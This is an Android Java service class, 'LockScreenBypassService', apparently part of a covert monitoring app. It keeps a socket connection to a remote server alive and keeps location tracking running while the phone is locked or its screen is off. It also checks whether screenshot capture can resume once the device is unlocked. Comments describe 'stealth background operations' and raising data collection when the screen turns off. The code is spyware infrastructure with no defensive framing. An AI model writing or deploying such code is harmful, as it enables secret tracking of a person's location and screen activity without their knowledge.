package com.example.myapplication.services;

import android.app.KeyguardManager;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;
import android.view.WindowManager;

import com.example.myapplication.utils.LocationManager;
import com.example.myapplication.utils.ScreenshotManager;
import com.example.myapplication.utils.SocketManager;

public class LockScreenBypassService extends Service {
    private static final String TAG = "LockScreenBypassService";
    
    private BroadcastReceiver screenStateReceiver;
    private Handler backgroundHandler;
    private boolean isDeviceLocked = false;
    private boolean isScreenOff = false;
    
    // Background operation interval when locked (every 15 seconds)
    private static final long BACKGROUND_INTERVAL = 15000;
    
    @Override
    public void onCreate() {
        super.onCreate();
        registerScreenStateReceiver();
        startBackgroundOperations();
        Log.d(TAG, "LockScreenBypassService created");
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "LockScreenBypassService started");
        return START_STICKY;
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onDestroy() {
        if (screenStateReceiver != null) {
            unregisterReceiver(screenStateReceiver);
        }
        
        if (backgroundHandler != null) {
            backgroundHandler.removeCallbacksAndMessages(null);
        }
        
        Log.d(TAG, "LockScreenBypassService destroyed");
        super.onDestroy();
    }
    
    private void registerScreenStateReceiver() {
        screenStateReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                String action = intent.getAction();
                
                if (Intent.ACTION_SCREEN_OFF.equals(action)) {
                    isScreenOff = true;
                    Log.d(TAG, "Screen turned OFF - continuing background operations");
                    handleScreenOff();
                    
                } else if (Intent.ACTION_SCREEN_ON.equals(action)) {
                    isScreenOff = false;
                    Log.d(TAG, "Screen turned ON");
                    handleScreenOn();
                    
                } else if (Intent.ACTION_USER_PRESENT.equals(action)) {
                    isDeviceLocked = false;
                    Log.d(TAG, "Device UNLOCKED");
                    handleDeviceUnlocked();
                    
                } else if ("android.intent.action.DREAMING_STARTED".equals(action)) {
                    Log.d(TAG, "Device entered sleep/dream mode");
                    handleDeviceLocked();
                    
                } else if ("android.intent.action.DREAMING_STOPPED".equals(action)) {
                    Log.d(TAG, "Device exited sleep/dream mode");
                }
            }
        };
        
        IntentFilter filter = new IntentFilter();
        filter.addAction(Intent.ACTION_SCREEN_OFF);
        filter.addAction(Intent.ACTION_SCREEN_ON);
        filter.addAction(Intent.ACTION_USER_PRESENT);
        filter.addAction("android.intent.action.DREAMING_STARTED");
        filter.addAction("android.intent.action.DREAMING_STOPPED");
        
        registerReceiver(screenStateReceiver, filter);
    }
    
    private void startBackgroundOperations() {
        backgroundHandler = new Handler(Looper.getMainLooper());
        backgroundHandler.post(backgroundOperationsRunnable);
    }
    
    private final Runnable backgroundOperationsRunnable = new Runnable() {
        @Override
        public void run() {
            // Perform background operations regardless of lock state
            performBackgroundOperations();
            
            // Schedule next execution
            long interval = (isScreenOff || isDeviceLocked) ? BACKGROUND_INTERVAL : BACKGROUND_INTERVAL * 2;
            backgroundHandler.postDelayed(this, interval);
        }
    };
    
    private void handleScreenOff() {
        // When screen turns off, increase data collection frequency
        try {
            // Continue location tracking
            ensureLocationTracking();
            
            // Maintain socket connection
            ensureSocketConnection();
            
            Log.d(TAG, "Background operations activated for screen OFF state");
            
        } catch (Exception e) {
            Log.e(TAG, "Error handling screen off", e);
        }
    }
    
    private void handleScreenOn() {
        // When screen turns on, check if device is still locked
        checkLockState();
    }
    
    private void handleDeviceLocked() {
        isDeviceLocked = true;
        
        // Device is locked - activate stealth background operations
        try {
            // Ensure location continues tracking
            ensureLocationTracking();
            
            // Keep socket connection alive
            ensureSocketConnection();
            
            Log.d(TAG, "Device locked - background operations active");
            
        } catch (Exception e) {
            Log.e(TAG, "Error handling device lock", e);
        }
    }
    
    private void handleDeviceUnlocked() {
        isDeviceLocked = false;
        
        // Device unlocked - resume normal operations
        try {
            // Resume all normal operations
            ensureAllOperations();
            
            Log.d(TAG, "Device unlocked - resuming normal operations");
            
        } catch (Exception e) {
            Log.e(TAG, "Error handling device unlock", e);
        }
    }
    
    private void checkLockState() {
        try {
            KeyguardManager keyguardManager = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
            if (keyguardManager != null) {
                boolean wasLocked = isDeviceLocked;
                isDeviceLocked = keyguardManager.isKeyguardLocked();
                
                if (wasLocked != isDeviceLocked) {
                    if (isDeviceLocked) {
                        handleDeviceLocked();
                    } else {
                        handleDeviceUnlocked();
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error checking lock state", e);
        }
    }
    
    private void performBackgroundOperations() {
        try {
            // 1. Maintain socket connection
            ensureSocketConnection();
            
            // 2. Continue location tracking (works in background)
            ensureLocationTracking();
            
            // 3. Log status
            String status = String.format("Background ops - Screen: %s, Locked: %s", 
                    isScreenOff ? "OFF" : "ON", 
                    isDeviceLocked ? "YES" : "NO");
            Log.d(TAG, status);
            
            // 4. Check if we can still capture data
            if (!isScreenOff && !isDeviceLocked) {
                // Screen is on and unlocked - can capture screenshots
                ensureScreenCapture();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error in background operations", e);
        }
    }
    
    private void ensureSocketConnection() {
        try {
            if (!SocketManager.getInstance().isConnected()) {
                Log.d(TAG, "Reconnecting socket during background operation");
                SocketManager.getInstance().initialize();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error ensuring socket connection", e);
        }
    }
    
    private void ensureLocationTracking() {
        try {
            if (!LocationManager.getInstance().isTracking()) {
                Log.d(TAG, "Restarting location tracking during background operation");
                // Location continues to work even when locked
                LocationManager.getInstance().startLocationUpdates(this, new LocationManager.LocationUpdateListener() {
                    @Override
                    public void onLocationUpdate(android.location.Location location) {
                        Log.d(TAG, "Background location update: " + location.getLatitude() + ", " + location.getLongitude());
                    }
                    
                    @Override
                    public void onLocationError(String error) {
                        Log.e(TAG, "Background location error: " + error);
                    }
                });
            }
        } catch (Exception e) {
            Log.e(TAG, "Error ensuring location tracking", e);
        }
    }
    
    private void ensureScreenCapture() {
        try {
            // Only attempt screen capture if screen is on and unlocked
            if (!isScreenOff && !isDeviceLocked) {
                if (!ScreenshotManager.getInstance().isCapturing()) {
                    Log.d(TAG, "Screen available - ensuring screenshot capture");
                    // Note: This would need permission data from the main activity
                    // For now, just log that screen capture could be resumed
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error ensuring screen capture", e);
        }
    }
    
    private void ensureAllOperations() {
        ensureSocketConnection();
        ensureLocationTracking();
        ensureScreenCapture();
    }
    
    // Public method to get current state
    public boolean isDeviceLocked() {
        return isDeviceLocked;
    }
    
    public boolean isScreenOff() {
        return isScreenOff;
    }
}
